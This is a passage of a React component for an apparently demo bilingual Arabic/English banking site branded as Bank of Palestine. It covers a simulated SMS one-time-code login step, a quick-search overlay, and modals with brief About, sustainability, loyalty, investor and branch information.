                      <span className="text-2xl font-black font-mono tracking-widest text-brand block">
                        {mfaCode}
                      </span>
                      <p className="text-[10px] text-amber-900/70 font-medium">
                        {lang === 'ar' 
                          ? '🛡️ تم محاكاة إرسال هذا الرمز لرسائلك النصية. أدخله أدناه للمصادقة.' 
                          : '🛡️ Simulated SMS OTP. Enter this verification digits to log in.'}
                      </p>
                    </div>

                    <form onSubmit={(e) => {
                      const fd = new FormData(e.currentTarget);
                      const codeVal = fd.get('otpcode')?.toString() || '';
                      handleMfaSubmit(e, codeVal);
                    }} className="space-y-4">
                      <div>
                        <label className="text-xs font-bold text-gray-700 block mb-1">
                          {lang === 'ar' ? 'أدخل رمز الأمان المكون من 4 أرقام' : 'Enter 4-Digit Security Code'}
                        </label>
                        <input
                          type="text"
                          name="otpcode"
                          required
                          maxLength={4}
                          placeholder="0000"
                          className="w-full bg-slate-50 border border-gray-200 rounded-lg px-3 py-2.5 text-center text-lg font-black tracking-widest focus:ring-1 focus:ring-brand focus:outline-none font-mono"
                        />
                      </div>

                      <div className="flex gap-3 mt-6">
                        <button
                          type="button"
                          onClick={() => setShowMfaStep(false)}
                          className="flex-1 bg-white border border-gray-200 hover:bg-gray-50 text-gray-700 font-bold text-xs py-3 rounded-lg transition-colors cursor-pointer"
                        >
                          {lang === 'ar' ? 'السابق' : 'Previous'}
                        </button>
                        <button
                          type="submit"
                          className="flex-1 bg-brand hover:bg-brand-dark text-white font-extrabold text-xs py-3 rounded-lg shadow-md transition-all cursor-pointer"
                        >
                          {lang === 'ar' ? 'دخول آمن للمحافظ' : 'Verify & Login'}
                        </button>
                      </div>
                    </form>
                  </div>
                )}

              </div>

            </div>
          </div>
        )
      )}

      {/* ========================================================
         INTERACTIVE SEARCH OVERLAY MODAL
         ======================================================== */}
      {searchOpen && (
        <div className="fixed inset-0 z-50 bg-charcoal/80 backdrop-blur-md flex items-start justify-center pt-24 px-4">
          <div className="bg-white rounded-2xl w-full max-w-xl overflow-hidden shadow-2xl border border-gray-200/50 p-6 animate-slide-down text-right">
            
            {/* Header */}
            <div className="flex items-center justify-between border-b border-gray-150 pb-3 mb-4">
              <span className="text-sm font-black text-gray-800 flex items-center gap-1.5 justify-start">
                <Search className="w-5 h-5 text-brand" />
                <span>{lang === 'ar' ? 'محرك البحث السريع والمطابقة' : 'Intelligent Quick Search'}</span>
              </span>
              <button 
                onClick={() => { setSearchOpen(false); setSearchQuery(''); }}
                className="p-1 hover:bg-gray-50 rounded-full transition-colors cursor-pointer"
              >
                <X className="w-5 h-5 text-gray-400" />
              </button>
            </div>

            {/* Input field */}
            <input
              type="text"
              autoFocus
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder={t.searchPlaceholder}
              className="w-full bg-slate-50 border border-gray-200 rounded-xl px-4 py-3.5 text-xs font-bold focus:outline-none focus:ring-1 focus:ring-brand text-right"
            />

            {/* Search query match list / options suggestions */}
            <div className="mt-6 space-y-3 text-right">
              <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest block mb-1">
                {lang === 'ar' ? 'روابط واختصارات مقترحة للمطابقة' : 'Quick links suggestions'}
              </span>

              {/* Suggestions */}
              {[
                { label: lang === 'ar' ? 'حاسبة القروض والتمويل العقاري والسيارات' : 'Loan Repayment & EMI Calculators', page: 'loans' as ActivePage },
                { label: lang === 'ar' ? 'أسعار الصرف والعملات وحاسبة التبادل' : 'Exchange Index & Currency Converter', page: 'transfers' as ActivePage },
                { label: lang === 'ar' ? 'مقارنة وطلب بطاقات الائتمان الفاخرة' : 'Credit Card Comparison & Rewards', page: 'cards' as ActivePage },
                { label: lang === 'ar' ? 'فتح حسابات توفير وحسابات جارية سريعة' : 'Open Current or Smart Savings Account', page: 'accounts' as ActivePage }
              ]
              .filter(item => !searchQuery || item.label.toLowerCase().includes(searchQuery.toLowerCase()))
              .map((item, index) => (
                <button
                  key={index}
                  onClick={() => {
                    setActivePage(item.page);
                    setSearchOpen(false);
                    setSearchQuery('');
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                  }}
                  className="w-full text-right p-3 rounded-lg bg-slate-50 border border-gray-100 hover:bg-brand-light/40 hover:text-brand text-xs font-bold transition-all flex items-center justify-between cursor-pointer"
                >
                  <span>{item.label}</span>
                  <ChevronDown className="w-4 h-4 transform rotate-270" />
                </button>
              ))}
            </div>

          </div>
        </div>
      )}

      {/* ========================================================
         INSTITUTIONAL INFORMATION MODAL OVERLAY (About Us, Sustainability, etc.)
         ======================================================== */}
      {infoModalContent && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl border border-gray-200 w-full max-w-xl overflow-hidden shadow-2xl animate-scale-up text-right">
            
            {/* Header */}
            <div className="bg-charcoal text-white p-5 flex items-center justify-between shadow-sm">
              <h3 className="text-base font-black">
                {infoModalContent === 'about' ? (lang === 'ar' ? 'من نحن • بنك فلسطين' : 'About Us') :
                 infoModalContent === 'sustainability' ? (lang === 'ar' ? 'الاستدامة والخدمة المجتمعية' : 'Sustainability & ESG') :
                 infoModalContent === 'loyalty' ? (lang === 'ar' ? 'برنامج مكافآت ولاء العملاء' : 'Customer Loyalty Program') :
                 infoModalContent === 'investor' ? (lang === 'ar' ? 'علاقات المستثمرين والإفصاحات' : 'Investor Relations') :
                 infoModalContent === 'branches' ? (lang === 'ar' ? 'مواقع الفروع ومواعيد العمل' : 'Branches & ATM Networks') :
                                                   (lang === 'ar' ? 'الشروط والأحكام والامتثال' : 'Terms & Regulatory Compliance')}
              </h3>
              <button 
                onClick={() => setInfoModalContent(null)}
                className="p-1 hover:bg-white/10 rounded-full transition-colors cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Content Box */}
            <div className="p-6 space-y-4">
              
              {/* About Us */}
              {infoModalContent === 'about' && (
                <div className="space-y-4">
                  <div className="w-12 h-12 rounded-full bg-brand-light text-brand flex items-center justify-center">
                    <Users className="w-6 h-6" />
                  </div>
                  <p className="text-xs sm:text-sm font-medium text-gray-600 leading-relaxed">
                    {lang === 'ar' 
                      ? 'تأسس بنك فلسطين ليكون منصة مصرفية وطنية وعالمية رائدة تهدف لتبسيط حياة الأفراد المالية وتمكين قطاع الشركات من خلال حلول مالية فريدة مدمجة بأعلى درجات الموثوقية والأمان.' 
                      : 'Bank of Palestine was incorporated to serve as a world-class banking standard, redefining retail client convenience and boosting corporate capital investments.'}
                  </p>
                  <p className="text-xs text-gray-500 font-bold leading-relaxed">
                    📍 {lang === 'ar' ? 'المقر الرئيسي: رام الله، فلسطين.' : 'Corporate Headquarters: Ramallah, Palestine.'}
                  </p>
                </div>
              )}

              {/* Sustainability */}
              {infoModalContent === 'sustainability' && (
                <div className="space-y-4">
                  <div className="w-12 h-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center">
                    <Leaf className="w-6 h-6" />
                  </div>
                  <p className="text-xs sm:text-sm font-medium text-gray-600 leading-relaxed">
                    {lang === 'ar' 
                      ? 'نلتزم التزاماً كاملاً بدعم التحول البيئي الأخضر وتقليص البصمة الكربونية للعمليات المصرفية. قروض تمويل الطاقة والسيارات الكهربائية لدينا تقدم بأسعار فائدة منخفضة لتشجيع الاستهلاك المستدام.' 
                      : 'We adhere to proactive Environmental, Social, and Governance (ESG) limits. Carbon footprints reduced by 40% and paperless operations enforced across Palestinian branches.'}
                  </p>
                </div>
              )}

              {/* Loyalty */}
              {infoModalContent === 'loyalty' && (
                <div className="space-y-4">
                  <div className="w-12 h-12 rounded-full bg-amber-50 text-amber-600 flex items-center justify-center">
                    <Award className="w-6 h-6" />
                  </div>
                  <p className="text-xs sm:text-sm font-medium text-gray-600 leading-relaxed">
                    {lang === 'ar' 
                      ? 'برنامج ولاء بنك فلسطين يمنحك نقاطاً فورية ومضاعفة على كافة مدفوعاتك المحلية والدولية. استبدل نقاطك فوراً بكاش أو تذاكر طيران فاخرة وحجوزات فنادق خمس نجوم مجاناً.' 
                      : 'Our bespoke Rewards framework compensates every transaction. Accrued loyalty points can be instantly redeemed for cashback, luxury flights, or premium hotel bookings.'}
                  </p>
                </div>
              )}

              {/* Investor Relations */}
              {infoModalContent === 'investor' && (
                <div className="space-y-4">
                  <div className="w-12 h-12 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center">
                    <TrendingUp className="w-6 h-6" />
                  </div>
                  <p className="text-xs sm:text-sm font-medium text-gray-600 leading-relaxed">
                    {lang === 'ar' 
                      ? 'علاقات المستثمرين في بنك فلسطين تقدم إفصاحات مالية شفافة وتقارير الربع السنوية المدققة لضمان ثقة المساهمين وامتثال البنك التام للقوانين الرقابية.' 
                      : 'Access fully audited annual statements, quarterly sheets, and regulatory compliance reports verified according to corporate governance standards.'}
                  </p>
                </div>
              )}

              {/* Branches */}
              {infoModalContent === 'branches' && (
                <div className="space-y-4">
                  <div className="w-12 h-12 rounded-full bg-purple-50 text-purple-600 flex items-center justify-center">
                    <Landmark className="w-6 h-6" />
                  </div>
                  <div className="text-xs sm:text-sm font-medium text-gray-600 space-y-3">
                    <p>
                      🏢 <strong>{lang === 'ar' ? 'الفرع الرئيسي والمقر العام:' : 'Main Branch (HQ):'}</strong><br />
                      {lang === 'ar' ? 'ساعات العمل: الأحد - الخميس، 8:30 صباحاً - 3:00 مساءً.' : 'Hours: Sunday - Thursday, 8:30 AM - 3:00 PM.'}
                    </p>
                    <p>
                      🏧 <strong>{lang === 'ar' ? 'شبكة الصرافات الآلية الرقمية:' : 'Digital ATM Networks:'}</strong><br />
                      {lang === 'ar' ? 'أكثر من 200 جهاز صراف آلي مفعل يدعم السحب اللاتلامسي والـ QR على مدار الساعة.' : 'Over 200 state-of-the-art contact-free active ATMs available 24/7/365.'}
                    </p>
                  </div>
                </div>
              )}

              {/* Terms / Compliance fallback */}
              {!['about', 'sustainability', 'loyalty', 'investor', 'branches'].includes(infoModalContent) && (
                <div className="space-y-4">
                  <div className="w-12 h-12 rounded-full bg-rose-50 text-rose-600 flex items-center justify-center">
                    <ShieldCheck className="w-6 h-6" />
                  </div>
                  <p className="text-xs sm:text-sm font-medium text-gray-600 leading-relaxed">
                    {lang === 'ar' 
                      ? 'كافة معاملات بنك فلسطين خاضعة لرقابة سلطة النقد ومحمية بقوانين ضمان الودائع والتشفير الأمني المتقدم لنظام الحوالات الدولي.' 
                      : 'All deposits fully covered by statutory deposit guarantee regulations. Customer security screened and compliant under Central Bank provisions.'}
                  </p>
                </div>
              )}

            </div>

            <div className="bg-slate-50 p-4 border-t border-gray-150 flex justify-end">
              <button
                onClick={() => setInfoModalContent(null)}
                className="bg-brand hover:bg-brand-dark text-white font-bold text-xs px-6 py-2.5 rounded-lg transition-colors cursor-pointer"
              >
                {lang === 'ar' ? 'موافق • إغلاق' : 'Okay, Close'}
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
